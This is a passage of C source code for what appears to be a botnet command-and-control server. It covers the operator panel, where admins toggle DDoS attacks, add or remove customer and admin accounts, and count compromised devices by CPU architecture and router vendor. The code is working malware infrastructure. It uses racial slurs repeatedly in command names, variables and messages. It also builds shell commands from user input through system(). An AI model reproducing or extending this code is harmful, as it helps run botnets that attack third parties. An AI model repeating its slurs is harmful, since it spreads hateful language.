				Title[datafd].login = 56;
				if (ToggleAttacks == 0)
				{
					ToggleAttacks++;
					sprintf(botnet, "\e[37mAttacks Have Been Disabled\e[31m!\r\n");
					if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
						goto end;
					memset(botnet, 0, sizeof(botnet));
					FILE *LogFile;
					LogFile = fopen("Admin.log", "a");
					fprintf(LogFile, "%s: Has ToggledAttacks off.\r\n", accounts[find_line].username);
					fclose(LogFile);
				}
				else
				{
					sprintf(botnet, "\e[37mAttacks Are Already Disabled\e[31m!\r\n");
					if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
						goto end;
					memset(botnet, 0, sizeof(botnet));
					FILE *LogFile;
					LogFile = fopen("Admin.log", "a");
					fprintf(LogFile, "%s: Has Tried to ToggledAttacks Off But They Are Already Off.\r\n", accounts[find_line].username);
					fclose(LogFile);
				}
			}
			else
			{
				sprintf(botnet, "\e[37mOnly Admins Can ToggleAttacks Off\e[31m!\r\n");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
				FILE *LogFile;
				LogFile = fopen("Server.log", "a");
				fprintf(LogFile, "%s: Has Tried To ToggleAttacks Off Without Being a Admin.\r\n", accounts[find_line].username);
				fclose(LogFile);
			}
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "TOGGLEBITCHESON"))
		{
			if (strcmp(admin, accounts[find_line].id) == 0)
			{
				sprintf(Title[datafd].string, accounts[find_line].expiry);
				Title[datafd].login = 55;
				if (ToggleAttacks == 1)
				{
					ToggleAttacks--;
					sprintf(botnet, "\e[37mAttacks Have Been Enabled\e[31m!\r\n");
					if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
						goto end;
					memset(botnet, 0, sizeof(botnet));
					FILE *LogFile;
					LogFile = fopen("Admin.log", "a");
					fprintf(LogFile, "%s: Has ToggledAttacks off.\r\n", accounts[find_line].username);
					fclose(LogFile);
				}
				else
				{
					sprintf(botnet, "\e[37mAttacks Are Already Enabled\e[31m!\r\n");
					if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
						goto end;
					memset(botnet, 0, sizeof(botnet));
					FILE *LogFile;
					LogFile = fopen("Admin.log", "a");
					fprintf(LogFile, "%s: Has Tried to ToggledAttacks On But They Are Already On.\r\n", accounts[find_line].username);
					fclose(LogFile);
				}
			}
			else
			{
				sprintf(botnet, "\e[37mOnly Admins Can ToggleAttacks On\e[31m!\r\n");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
				FILE *LogFile;
				LogFile = fopen("Server.log", "a");
				fprintf(LogFile, "%s: Has Tried To On ToggleAttacks Without Being a Admin.\r\n", accounts[find_line].username);
				fclose(LogFile);
			}
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "ADDUSER"))
		{
			if (strcmp(admin, accounts[find_line].id) == 0)
			{
				sprintf(Title[datafd].string, accounts[find_line].expiry);
				Title[datafd].login = 45;
				char username[80];
				char password[80];
				char MaxTime[80];
				char CoolDown[80];
				char expiry[80];
				sprintf(botnet, "\e[37mUsername\e[31m:\e[37m ");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
				memset(buf, 0, sizeof(buf));
				if (fdgets(buf, sizeof(buf), datafd) < 1)
					goto end;
				trim(buf);
				if (strlen(buf) > 80 || strlen(buf) < 1)
				{
					sprintf(botnet, "\e[37mInvalid Username\e[31m!\r\n");
					if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
						goto end;
					memset(botnet, 0, sizeof(botnet));
					goto WhileEnd;
				}
				strcpy(username, buf);
				int k;
				for (k = 0; k < 100; k++)
				{
					if (strcmp(username, accounts[k].username) == 0)
					{
						sprintf(botnet, "\e[37mThis Username Is Already In Use\e[31m!\r\n");
						if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
							goto end;
						memset(botnet, 0, sizeof(botnet));
						goto WhileEnd;
					}
				}
				sprintf(botnet, "\e[37mPassword\e[31m:\e[37m ");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
				memset(buf, 0, sizeof(buf));
				if (fdgets(buf, sizeof(buf), datafd) < 1)
					goto end;
				trim(buf);
				if (strlen(buf) > 80 || strlen(buf) < 1)
				{
					sprintf(botnet, "\e[37mInvalid Password\e[31m!\r\n");
					if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
						goto end;
					memset(botnet, 0, sizeof(botnet));
					goto WhileEnd;
				}
				strcpy(password, buf);
				sprintf(botnet, "\e[37mMaxTime\e[31m:\e[37m ");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
				memset(buf, 0, sizeof(buf));
				if (fdgets(buf, sizeof(buf), datafd) < 1)
					goto end;
				trim(buf);
				if (strlen(buf) > 80 || strlen(buf) < 1)
				{
					sprintf(botnet, "\e[37mInvalid MaxTime\e[31m!\r\n");
					if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
						goto end;
					memset(botnet, 0, sizeof(botnet));
					goto WhileEnd;
				}
				strcpy(MaxTime, buf);
				sprintf(botnet, "\e[37mCoolDown\e[31m:\e[37m ");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
				memset(buf, 0, sizeof(buf));
				if (fdgets(buf, sizeof(buf), datafd) < 1)
					goto end;
				trim(buf);
				if (strlen(buf) > 80 || strlen(buf) < 1)
				{
					sprintf(botnet, "\e[37mInvalid CoolDown\e[31m!\r\n");
					if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
						goto end;
					memset(botnet, 0, sizeof(botnet));
					goto WhileEnd;
				}
				strcpy(CoolDown, buf);
				sprintf(botnet, "\e[37mExpiry\e[31m:\e[37m ");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
				memset(buf, 0, sizeof(buf));
				if (fdgets(buf, sizeof(buf), datafd) < 1)
					goto end;
				trim(buf);
				if (strlen(buf) > 80 || strlen(buf) < 1)
				{
					sprintf(botnet, "\e[37mInvalid Expiry\e[31m!\r\n");
					if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
						goto end;
					memset(botnet, 0, sizeof(botnet));
					goto WhileEnd;
				}
				strcpy(expiry, buf);
				FILE *Login = fopen("Login.txt", "a");
				fprintf(Login, "%s %s common %s %s %s\r\n", username, password, MaxTime, CoolDown, expiry);
				fclose(Login);
				FILE *LogFile;
				LogFile = fopen("Admin.log", "a");
				fprintf(LogFile, "%s: Has Added User: %s To The Net!\r\n", accounts[find_line].username, username);
				fclose(LogFile);

				sprintf(botnet, "\e[37mAccount Has Been Successfully Added\e[31m.\r\n");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
			}
			else
			{
				sprintf(botnet, "\e[37mOnly Admins Can Add Users\e[31m!\r\n");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
				FILE *LogFile;
				LogFile = fopen("Server.log", "a");
				fprintf(LogFile, "%s: Has Tried To Add A User Without Being a Admin.\r\n", accounts[find_line].username);
				fclose(LogFile);
			}
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "ADDNIGG"))
		{
			if (strcmp(admin, accounts[find_line].id) == 0)
			{
				sprintf(Title[datafd].string, accounts[find_line].expiry);
				Title[datafd].login = 46;
				char username[80];
				char password[80];
				char MaxTime[80];
				char CoolDown[80];
				char expiry[80];
				sprintf(botnet, "\e[37mUsername\e[31m:\e[37m ");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
				memset(buf, 0, sizeof(buf));
				if (fdgets(buf, sizeof(buf), datafd) < 1)
					goto end;
				trim(buf);
				if (strlen(buf) > 80 || strlen(buf) < 1)
				{
					sprintf(botnet, "\e[37mInvalid Username\e[31m!\r\n");
					if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
						goto end;
					memset(botnet, 0, sizeof(botnet));
					goto WhileEnd;
				}
				strcpy(username, buf);
				int k;
				for (k = 0; k < 100; k++)
				{
					if (strcmp(username, accounts[k].username) == 0)
					{
						sprintf(botnet, "\e[37mThis Username Is Already In Use\e[31m!\r\n");
						if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
							goto end;
						memset(botnet, 0, sizeof(botnet));
						goto WhileEnd;
					}
				}
				sprintf(botnet, "\e[37mPassword\e[31m:\e[37m ");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
				memset(buf, 0, sizeof(buf));
				if (fdgets(buf, sizeof(buf), datafd) < 1)
					goto end;
				trim(buf);
				if (strlen(buf) > 80 || strlen(buf) < 1)
				{
					sprintf(botnet, "\e[37mInvalid Password\e[31m!\r\n");
					if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
						goto end;
					memset(botnet, 0, sizeof(botnet));
					goto WhileEnd;
				}
				strcpy(password, buf);
				sprintf(botnet, "\e[37mMaxTime\e[31m:\e[37m ");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
				memset(buf, 0, sizeof(buf));
				if (fdgets(buf, sizeof(buf), datafd) < 1)
					goto end;
				trim(buf);
				if (strlen(buf) > 80 || strlen(buf) < 1)
				{
					sprintf(botnet, "\e[37mInvalid MaxTime\e[31m!\r\n");
					if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
						goto end;
					memset(botnet, 0, sizeof(botnet));
					goto WhileEnd;
				}
				strcpy(MaxTime, buf);
				sprintf(botnet, "\e[37mCoolDown\e[31m:\e[37m ");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
				memset(buf, 0, sizeof(buf));
				if (fdgets(buf, sizeof(buf), datafd) < 1)
					goto end;
				trim(buf);
				if (strlen(buf) > 80 || strlen(buf) < 1)
				{
					sprintf(botnet, "\e[37mInvalid CoolDown\e[31m!\r\n");
					if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
						goto end;
					memset(botnet, 0, sizeof(botnet));
					goto WhileEnd;
				}
				strcpy(CoolDown, buf);
				sprintf(botnet, "\e[37mExpiry\e[31m:\e[37m ");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
				memset(buf, 0, sizeof(buf));
				if (fdgets(buf, sizeof(buf), datafd) < 1)
					goto end;
				trim(buf);
				if (strlen(buf) > 80 || strlen(buf) < 1)
				{
					sprintf(botnet, "\e[37mInvalid Expiry\e[31m!\r\n");
					if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
						goto end;
					memset(botnet, 0, sizeof(botnet));
					goto WhileEnd;
				}
				strcpy(expiry, buf);
				FILE *Login = fopen("Login.txt", "a");
				fprintf(Login, "%s %s admin %s %s %s\r\n", username, password, MaxTime, CoolDown, expiry);
				fclose(Login);
				FILE *LogFile;
				LogFile = fopen("Admin.log", "a");
				fprintf(LogFile, "%s: Has Added Admin: %s To The Net!\r\n", accounts[find_line].username, username);
				fclose(LogFile);

				sprintf(botnet, "\e[37mAccount Has Been Successfully Added\e[31m.\r\n");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
			}
			else
			{
				sprintf(botnet, "\e[37mOnly Admins Can Add Users\e[31m!\r\n");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
				FILE *LogFile;
				LogFile = fopen("Server.log", "a");
				fprintf(LogFile, "%s: Has Tried To Add A User Without Being a Admin.\r\n", accounts[find_line].username);
				fclose(LogFile);
			}
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "REMUSER"))
		{
			if (strcmp(admin, accounts[find_line].id) == 0)
			{
				sprintf(Title[datafd].string, accounts[find_line].expiry);
				Title[datafd].login = 47;
				char username[80];
				int checking = 1;
				sprintf(botnet, "\e[37mUsername\e[31m:\e[37m ");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
				memset(buf, 0, sizeof(buf));
				if (fdgets(buf, sizeof(buf), datafd) < 1)
					goto end;
				trim(buf);
				if (strlen(buf) > 80 || strlen(buf) < 1)
				{
					sprintf(botnet, "\e[37mInvalid Username\e[31m!\r\n");
					if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
						goto end;
					memset(botnet, 0, sizeof(botnet));
					goto WhileEnd;
				}
				strcpy(username, buf);
				int k;
				k = Find_Login(username);
				if (strcmp(username, accounts[k].username) == 0)
				{
					char cmd[80];
					sprintf(cmd, "sed '/\\<%s\\>/d' -i Login.txt", username);
					system(cmd);
					checking = 0;
					FILE *LogFile;
					LogFile = fopen("Admin.log", "a");
					fprintf(LogFile, "%s: Has Remv Acc: %s From The Net!\r\n", accounts[find_line].username, username);
					fclose(LogFile);
					sprintf(botnet, "\e[37mUser Has Been Successfully Deleted.\r\n");
					if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
						goto end;
					memset(botnet, 0, sizeof(botnet));
				}
				if (checking == 1)
				{
					sprintf(botnet, "\e[37mInvalid Username\e[31m!\r\n");
					if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
						goto end;
					memset(botnet, 0, sizeof(botnet));
					goto WhileEnd;
				}
			}
			else
			{
				sprintf(botnet, "\e[37mOnly Admins Can Remove Users\e[31m!\r\n");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
				FILE *LogFile;
				LogFile = fopen("Server.log", "a");
				fprintf(LogFile, "%s: Has Tried To Remove A User Without Being a Admin.\r\n", accounts[find_line].username);
				fclose(LogFile);
			}
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "CHANGE"))
		{
			sprintf(Title[datafd].string, accounts[find_line].expiry);
			Title[datafd].login = 57;
			sprintf(botnet, "\e[37mCurrent Username\e[31m:\e[37m ");
			if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
				goto end;
			memset(botnet, 0, sizeof(botnet));
			memset(buf, 0, sizeof(buf));
			if (fdgets(buf, sizeof(buf), datafd) < 1)
				goto end;
			trim(buf);
			if (strlen(buf) > 80 || strlen(buf) < 1)
			{
				sprintf(botnet, "\e[37mInvalid Username\e[31m!\r\n");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
				goto WhileEnd;
			}
			strcpy(username, buf);
			if (strcmp(username, accounts[find_line].username) != 0)
			{
				sprintf(botnet, "\e[37mInvalid Username\e[31m!\r\n");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
				goto WhileEnd;
			}
			char newusername[80];
			sprintf(botnet, "\e[37mNew Username\e[31m:\e[37m ");
			if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
				goto end;
			memset(botnet, 0, sizeof(botnet));
			memset(buf, 0, sizeof(buf));
			if (fdgets(buf, sizeof(buf), datafd) < 1)
				goto end;
			trim(buf);
			if (strlen(buf) > 80 || strlen(buf) < 1)
			{
				sprintf(botnet, "\e[37mInvalid Username\e[31m!\r\n");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
				goto WhileEnd;
			}
			strcpy(newusername, buf);
			if (strcmp(newusername, username) == 0)
			{
				sprintf(botnet, "\e[37mYou Cant Use The Same Username\e[31m!\r\n");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
				goto WhileEnd;
			}
			int k;
			for (k = 0; k < 100; k++)
			{
				if (strcmp(newusername, accounts[k].username) == 0)
				{
					sprintf(botnet, "\e[37mThis Username Is Already In Use\e[31m!\r\n");
					if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
						goto end;
					memset(botnet, 0, sizeof(botnet));
					goto WhileEnd;
				}
			}
			sprintf(botnet, "\e[37mCurrent Password\e[31m:\e[37m ");
			if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
				goto end;
			memset(botnet, 0, sizeof(botnet));
			memset(buf, 0, sizeof(buf));
			if (fdgets(buf, sizeof(buf), datafd) < 1)
				goto end;
			trim(buf);
			if (strlen(buf) > 80 || strlen(buf) < 1)
			{
				sprintf(botnet, "\e[37mInvalid Password\e[31m!\r\n");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
				goto WhileEnd;
			}
			strcpy(password, buf);
			if (strcmp(password, accounts[find_line].password) != 0)
			{
				sprintf(botnet, "\e[37mInvalid Password\e[31m!\r\n");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
				goto WhileEnd;
			}
			char newpassword[80];
			sprintf(botnet, "\e[37mNew Password\e[31m:\e[37m ");
			if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
				goto end;
			memset(botnet, 0, sizeof(botnet));
			memset(buf, 0, sizeof(buf));
			if (fdgets(buf, sizeof(buf), datafd) < 1)
				goto end;
			trim(buf);
			if (strlen(buf) > 80 || strlen(buf) < 1)
			{
				sprintf(botnet, "\e[37mInvalid Password\e[31m!\r\n");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
				goto WhileEnd;
			}
			strcpy(newpassword, buf);
			if (strcmp(newpassword, password) == 0)
			{
				sprintf(botnet, "\e[37mYou Cant Use The Same Password\e[31m!\r\n");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
				goto WhileEnd;
			}
			if (strcmp(admin, accounts[find_line].id) == 0)
			{
				FILE *adminLogin = fopen("Login.txt", "a");
				fprintf(adminLogin, "%s %s admin %d %d %s\r\n", newusername, newpassword, accounts[find_line].maxtime, accounts[find_line].cooldown, accounts[find_line].expiry);
				fclose(adminLogin);
			}
			else
			{
				FILE *commonLogin = fopen("Login.txt", "a");
				fprintf(commonLogin, "%s %s common %d %d %s\r\n", newusername, newpassword, accounts[find_line].maxtime, accounts[find_line].cooldown, accounts[find_line].expiry);
				fclose(commonLogin);
			}
			char cmd[80];
			sprintf(cmd, "sed '/\\<%s\\>/d' -i Login.txt", accounts[find_line].username);
			system(cmd);
			FILE *LogFile;
			LogFile = fopen("Server.log", "a");
			fprintf(LogFile, "%s: Has Changed There Account Info.\r\n", accounts[find_line].username);
			fclose(LogFile);
			sprintf(botnet, "\e[37mYour Account Info Was Successfully Changed.\r\nNote\e[31m:\e[37m Your Old Account Info Will Not Work Anymore.\r\n");
			if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
				goto end;
			memset(botnet, 0, sizeof(botnet));
			goto WhileEnd;
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "STATS"))
		{
			sprintf(Title[datafd].string, accounts[find_line].expiry);
			Title[datafd].login = 18;
			char niggers1[5000];
			char niggers2[5000];
			char niggers3[5000];
			char niggers4[5000];
			char niggers5[5000];
			char niggers6[5000];

			sprintf(niggers1, "\e[31mTotal Bots\e[95m: \e[31m[\e[96m%d\e[31m]\r\n", BotsConnected());
			sprintf(niggers2, "\e[31mTotal Users\e[95m: \e[31m[\e[96m%d\e[31m]\r\n", UsersConnected);
			sprintf(niggers3, "\e[31mTotal Dupes\e[95m: \e[31m[\e[96m0\e[31m]\r\n");
			sprintf(niggers4, "\e[31mTotal Logins\e[95m: \e[31m[\e[96m%d\e[31m]\r\n", UsersLogged);
			sprintf(niggers5, "\e[31mTotal Attacks\e[95m: \e[31m[\e[96m%d\e[31m]\r\n", UsersAttacks);
			sprintf(niggers6, "\e[31mTotal DupsDeleted\e[95m: \e[31m[\e[96m%d\e[31m]\r\n", DupesDeleted);

			if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
				goto end;
			if (send(datafd, niggers1, strlen(niggers1), MSG_NOSIGNAL) == -1)
				goto end;
			memset(niggers1, 0, sizeof(niggers1));
			if (send(datafd, niggers2, strlen(niggers2), MSG_NOSIGNAL) == -1)
				goto end;
			memset(niggers2, 0, sizeof(niggers2));
			if (send(datafd, niggers3, strlen(niggers3), MSG_NOSIGNAL) == -1)
				goto end;
			memset(niggers3, 0, sizeof(niggers3));
			if (send(datafd, niggers4, strlen(niggers4), MSG_NOSIGNAL) == -1)
				goto end;
			memset(niggers4, 0, sizeof(niggers4));
			if (send(datafd, niggers5, strlen(niggers5), MSG_NOSIGNAL) == -1)
				goto end;
			memset(niggers5, 0, sizeof(niggers5));
			if (send(datafd, niggers6, strlen(niggers6), MSG_NOSIGNAL) == -1)
				goto end;
			memset(niggers6, 0, sizeof(niggers6));
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "BOTS"))
		{
			sprintf(Title[datafd].string, accounts[find_line].expiry);
			Title[datafd].login = 6;
			if (BotsConnected() == 0)
			{
				char botsnot[5000];

				sprintf(botsnot, "\e[37mNo Devices Are Conneted.\r\n");

				if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
					goto end;
				if (send(datafd, botsnot, strlen(botsnot), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botsnot, 0, sizeof(botsnot));
			}
			else
			{
				char botsxd0[5000];

				sprintf(botsxd0, "\e[37mEnough Bots To Slam A Nigger.\r\n");

				if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
					goto end;
				if (send(datafd, botsxd0, strlen(botsxd0), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botsxd0, 0, sizeof(botsxd0));
			}
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

		if (strcasestr(buf, "ARCHES"))
		{
			sprintf(Title[datafd].string, accounts[find_line].expiry);
			Title[datafd].login = 44;
			if (BotsConnected() == 0)
			{
				char botslol[5000];

				sprintf(botslol, "\e[37mNo Devices Are Conneted.\r\n");

				if (send(datafd, "\e[2J\e[3J\e[H", 12, MSG_NOSIGNAL) == -1)
					goto end;
				if (send(datafd, botslol, strlen(botslol), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botslol, 0, sizeof(botslol));
			}
			else
			{
				if (strcmp(admin, accounts[find_line].id) == 0)
				{
					if (x86_64Connected() != 0)
					{
						char Simpsx86[5000];

						sprintf(Simpsx86, "\e[37mx86_64\e[38;5;196m:\e[37m %d\r\n", x86_64Connected());

						if (send(datafd, Simpsx86, strlen(Simpsx86), MSG_NOSIGNAL) == -1)
							goto end;
						memset(Simpsx86, 0, sizeof(Simpsx86));
					}
					if (i586Connected() != 0)
					{
						char Simpsi586[5000];

						sprintf(Simpsi586, "\e[37mi586\e[38;5;196m:\e[37m %d\r\n", i586Connected());

						if (send(datafd, Simpsi586, strlen(Simpsi586), MSG_NOSIGNAL) == -1)
							goto end;
						memset(Simpsi586, 0, sizeof(Simpsi586));
					}
					if (mipsConnected() != 0)
					{
						char Simpsmips[5000];

						sprintf(Simpsmips, "\e[37mmips\e[38;5;196m:\e[37m %d\r\n", mipsConnected());

						if (send(datafd, Simpsmips, strlen(Simpsmips), MSG_NOSIGNAL) == -1)
							goto end;
						memset(Simpsmips, 0, sizeof(Simpsmips));
					}
					if (mipselConnected() != 0)
					{
						char Simpsmipsel[5000];

						sprintf(Simpsmipsel, "\e[37mmipsel\e[38;5;196m:\e[37m %d\r\n", mipselConnected());

						if (send(datafd, Simpsmipsel, strlen(Simpsmipsel), MSG_NOSIGNAL) == -1)
							goto end;
						memset(Simpsmipsel, 0, sizeof(Simpsmipsel));
					}
					if (armv4lConnected() != 0)
					{
						char Simpsarmv4l[5000];

						sprintf(Simpsarmv4l, "\e[37marmv4l\e[38;5;196m:\e[37m %d\r\n", armv4lConnected());

						if (send(datafd, Simpsarmv4l, strlen(Simpsarmv4l), MSG_NOSIGNAL) == -1)
							goto end;
						memset(Simpsarmv4l, 0, sizeof(Simpsarmv4l));
					}
					if (armv5lConnected() != 0)
					{
						char Simpsarmv5l[5000];

						sprintf(Simpsarmv5l, "\e[37marmv5l\e[38;5;196m:\e[37m %d\r\n", armv5lConnected());

						if (send(datafd, Simpsarmv5l, strlen(Simpsarmv5l), MSG_NOSIGNAL) == -1)
							goto end;
						memset(Simpsarmv5l, 0, sizeof(Simpsarmv5l));
					}
					if (armv6lConnected() != 0)
					{
						char Simpsarmv6l[5000];

						sprintf(Simpsarmv6l, "\e[37marmv6l\e[38;5;196m:\e[37m %d\r\n", armv6lConnected());

						if (send(datafd, Simpsarmv6l, strlen(Simpsarmv6l), MSG_NOSIGNAL) == -1)
							goto end;
						memset(Simpsarmv6l, 0, sizeof(Simpsarmv6l));
					}
					if (armv7lConnected() != 0)
					{
						char Simpsarmv7l[5000];

						sprintf(Simpsarmv7l, "\e[37marmv7l\e[38;5;196m:\e[37m %d\r\n", armv7lConnected());

						if (send(datafd, Simpsarmv7l, strlen(Simpsarmv7l), MSG_NOSIGNAL) == -1)
							goto end;
						memset(Simpsarmv7l, 0, sizeof(Simpsarmv7l));
					}
					if (powerpcConnected() != 0)
					{
						char Simpspowerpc[5000];

						sprintf(Simpspowerpc, "\e[37mpowerpc\e[38;5;196m:\e[37m %d\r\n", powerpcConnected());

						if (send(datafd, Simpspowerpc, strlen(Simpspowerpc), MSG_NOSIGNAL) == -1)
							goto end;
						memset(Simpspowerpc, 0, sizeof(Simpspowerpc));
					}
					if (sparcConnected() != 0)
					{
						char Simpssparc[5000];

						sprintf(Simpssparc, "\e[37msparc\e[38;5;196m:\e[37m %d\r\n", sparcConnected());

						if (send(datafd, Simpssparc, strlen(Simpssparc), MSG_NOSIGNAL) == -1)
							goto end;
						memset(Simpssparc, 0, sizeof(Simpssparc));
					}
					if (m68kConnected() != 0)
					{
						char Simpsm68k[5000];

						sprintf(Simpsm68k, "\e[37mm68k\e[38;5;196m:\e[37m %d\r\n", m68kConnected());

						if (send(datafd, Simpsm68k, strlen(Simpsm68k), MSG_NOSIGNAL) == -1)
							goto end;
						memset(Simpsm68k, 0, sizeof(Simpsm68k));
					}
					if (i686Connected() != 0)
					{
						char Simpsi686[5000];

						sprintf(Simpsi686, "\e[37mi686\e[38;5;196m:\e[37m %d\r\n", i686Connected());

						if (send(datafd, Simpsi686, strlen(Simpsi686), MSG_NOSIGNAL) == -1)
							goto end;
						memset(Simpsi686, 0, sizeof(Simpsi686));
					}
					if (sh4Connected() != 0)
					{
						char Simpssh4[5000];

						sprintf(Simpssh4, "\e[37msh4\e[38;5;196m:\e[37m %d\r\n", sh4Connected());

						if (send(datafd, Simpssh4, strlen(Simpssh4), MSG_NOSIGNAL) == -1)
							goto end;
						memset(Simpssh4, 0, sizeof(Simpssh4));
					}
					if (hnapConnected() != 0)
					{
						char Simpshnap[5000];

						sprintf(Simpshnap, "\e[37mhnap\e[38;5;196m:\e[37m %d\r\n", hnapConnected());

						if (send(datafd, Simpshnap, strlen(Simpshnap), MSG_NOSIGNAL) == -1)
							goto end;
						memset(Simpshnap, 0, sizeof(Simpshnap));
					}
					if (realtekConnected() != 0)
					{
						char Simpsrealtek[5000];

						sprintf(Simpsrealtek, "\e[37mrealtek\e[38;5;196m:\e[37m %d\r\n", realtekConnected());

						if (send(datafd, Simpsrealtek, strlen(Simpsrealtek), MSG_NOSIGNAL) == -1)
							goto end;
						memset(Simpsrealtek, 0, sizeof(Simpsrealtek));
					}
					if (huaweiConnected() != 0)
					{
						char Simpshuawei[5000];

						sprintf(Simpshuawei, "\e[37mhuawei\e[38;5;196m:\e[37m %d\r\n", huaweiConnected());

						if (send(datafd, Simpshuawei, strlen(Simpshuawei), MSG_NOSIGNAL) == -1)
							goto end;
						memset(Simpshuawei, 0, sizeof(Simpshuawei));
					}
					if (x11Connected() != 0)
					{
						char Simps11[5000];

						sprintf(Simps11, "\e[37m11\e[38;5;196m:\e[37m %d\r\n", x11Connected());

						if (send(datafd, Simps11, strlen(Simps11), MSG_NOSIGNAL) == -1)
							goto end;
						memset(Simps11, 0, sizeof(Simps11));
					}
					if (archARMConnected() != 0)
					{
						char SimpsarchARM[5000];

